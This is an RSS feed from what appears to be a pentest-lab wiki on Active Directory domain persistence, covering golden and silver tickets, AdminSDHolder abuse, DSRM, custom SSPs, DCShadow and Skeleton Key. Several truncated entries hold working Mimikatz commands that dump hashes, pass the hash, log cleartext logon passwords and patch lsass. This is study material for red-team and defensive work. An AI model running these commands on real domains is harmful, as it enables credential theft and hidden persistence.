<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Domain Persistence on</title><link>https://wiki.bufu-sec.com/active_directory/domain_persistence/</link><description>Recent content in Domain Persistence on</description><generator>Hugo -- gohugo.io</generator><language>en-US</language><lastBuildDate>Sat, 06 Nov 2021 10:02:54 +0100</lastBuildDate><atom:link href="https://wiki.bufu-sec.com/active_directory/domain_persistence/index.xml" rel="self" type="application/rss+xml"/><item><title>Golden Tickets</title><link>https://wiki.bufu-sec.com/active_directory/domain_persistence/golden_tickets/</link><pubDate>Sat, 06 Nov 2021 11:53:35 +0100</pubDate><guid>https://wiki.bufu-sec.com/active_directory/domain_persistence/golden_tickets/</guid><description>General # Golden ticket is signed and ecrypted by hash of krbtgt account, making it a valid TGT ticket Since user account validation is not done by the DC/KDC until TGT is older than 20 minutes, we can use even deleted/revoked accounts krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine Password change has no effect on this attack Exploitation # Arguments # Argument Description kerberos::golden Module name /domain:domain:dollarcorp.</description></item><item><title>Silver Tickets</title><link>https://wiki.bufu-sec.com/active_directory/domain_persistence/silver_tickets/</link><pubDate>Sat, 06 Nov 2021 11:53:35 +0100</pubDate><guid>https://wiki.bufu-sec.com/active_directory/domain_persistence/silver_tickets/</guid><description>General # A valid TGS Encrypted and signed by NTLM hash of the target service account Services rarely check PAC (Privileged Attribute Certificate) Services will allow access only to the services themselves Reasonable persistence period (detauled 30 days for computer accounts) Exploitation # Arguments # Argument Description kerberos::golden Name of the module (there is no Silver module!) /domain:domain:dollarcorp.moneycorp.local Domain FQDN /sid:S-1-5-21-1874506631-3219952063-538504511 SID of the domain /target:dcorp dc.</description></item><item><title>ACL Persistence</title><link>https://wiki.bufu-sec.com/active_directory/domain_persistence/acl_attacks/</link><pubDate>Sat, 06 Nov 2021 11:53:35 +0100</pubDate><guid>https://wiki.bufu-sec.com/active_directory/domain_persistence/acl_attacks/</guid><description>AdminSDHolder # General # Resides in the System container of a domain Used to control the permissions - using an ACL - for certain built-in privileged groups (called Protected Groups) Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of protected groups and members with the ACL of AdminSDHolder Any differences are overwritten on the object ACL Protected groups Domain Admins Enterprise Admins Domain Controllers Read-only Domain Controllers Schema Admins Administrators Account Operators Backup Operators Server Operators Print Operators Replicator Protected Groups Abuse (All of the below can log on locally to DC) # Group Permissions Account Operators Cannot modify DA/EA/BA groups.</description></item><item><title>DSRM</title><link>https://wiki.bufu-sec.com/active_directory/domain_persistence/dsrm/</link><pubDate>Sat, 06 Nov 2021 11:53:35 +0100</pubDate><guid>https://wiki.bufu-sec.com/active_directory/domain_persistence/dsrm/</guid><description>General # DSRM is Directory Services Restore Mode There is a local administrator on every DC called &amp;ldquo;Administrator&amp;rdquo; whose password is the DSRM password DSRM password (SafeModePassword) is required when a server is promoted to a DC and it is rarely changed After altering the configuration on the DC, it is possible to pass the NTLM hash of this user to access the DC Exploitation # # Dump DSRM password (needs DA privs) Invoke-Mimikatz -Command &amp;#39;&amp;#34;token::elevate&amp;#34; &amp;#34;lsadump::sam&amp;#34;&amp;#39; -ComputerName dcorp-dc # Compare the Administrator hash with the Administrator hash of below command # The first on is the DSRM local Administrator Invoke-Mimikatz -Command &amp;#39;&amp;#34;lsadump::lsa /patch&amp;#34;&amp;#39; -ComputerName dcorp-dc # Need to change Logon Behavior for DSRM account before we can pass the hash to login Enter-PSSession -ComputerName dcorp-dc New-ItemProperty &amp;#34;HKLM:\System\CurrentControlSet\Control\Lsa\&amp;#34; -Name &amp;#34;DsrmAdminLogonBehavior&amp;#34; -Value 2 -PropertyType DWORD # Pass the hash to login Invoke-Mimikatz -Command &amp;#39;&amp;#34;sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.</description></item><item><title>Custom SSPs</title><link>https://wiki.bufu-sec.com/active_directory/domain_persistence/custom_ssps/</link><pubDate>Sat, 06 Nov 2021 11:53:35 +0100</pubDate><guid>https://wiki.bufu-sec.com/active_directory/domain_persistence/custom_ssps/</guid><description>General # A Security Support Provider (SSP) is a DLL which provides ways for an application to obtain an authenticated connection Some SSP packages by Microsoft are NTLM Kerberos Wdigest CredSSP Mimikatz provdes custom SSP - mimilib.dll This SSP logs local logons, service account and machine aacount passwords in clear text on the target server Exploitation # # First way: drop mimilib.dll to system32 and add mimilib to HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages $packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name &amp;#39;Security Packages&amp;#39; | Select -ExpandProperty &amp;#39;Security Packages&amp;#39; $packages += &amp;#34;mimilib&amp;#34; Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name &amp;#39;Security Packages&amp;#39; -Value $packages Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name &amp;#39;Security Packages&amp;#39; -Value $packages # Second way: using mimikatz to inject into lsass (unstable with Server 2016) Invoke-Mimikatz -Command &amp;#39;&amp;#34;misc::memssp&amp;#34;&amp;#39; # All logons on the DC are logged to C:\Windows\system32\kiwissp.</description></item><item><title>DC Shadow</title><link>https://wiki.bufu-sec.com/active_directory/domain_persistence/dcshadow/</link><pubDate>Sat, 06 Nov 2021 11:53:35 +0100</pubDate><guid>https://wiki.bufu-sec.com/active_directory/domain_persistence/dcshadow/</guid><description>General # Temporarily register a new domain controller in the target domain Use it to &amp;ldquo;push&amp;rdquo; attributes like SIDHistory or SPN on the target object Does not leave any change logs for the modified object New DC is registered my modifying the Configuration container, SPNs of an existing computer object and some RPC services Since attributes are changed from a DC, there are no change logs on the actual DC for the target object Requires DA privileges by default Attacker machine must be part of root domain of the forest Exploitation # Requires two mimikatz sessions One with SYSTEM privileges to start RPC servers and specifiy attributes we want to modify !</description></item><item><title>Skeleton Key</title><link>https://wiki.bufu-sec.com/active_directory/domain_persistence/skeleton_key/</link><pubDate>Sat, 06 Nov 2021 11:53:35 +0100</pubDate><guid>https://wiki.bufu-sec.com/active_directory/domain_persistence/skeleton_key/</guid><description>General # Patch a Domain Controller (lsass process) so that it allows access as any user with a single password Discovered in malware named Skeleton Key malware All publicly known methods are NOT persistent accross reboots Mimikatz to the rescue Exploitation # # Inject skeleton key on DC of choice with default password of &amp;#39;mimikatz&amp;#39;. DA privs required Invoke-Mimikatz -Command &amp;#39;&amp;#34;privilege::debug&amp;#34; &amp;#34;misc::skeleton&amp;#34;&amp;#39; -ComputerName dcorp-dc.dollarcorp.moneycorp.local # If lsass is running as procted process we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.</description></item></channel></rss>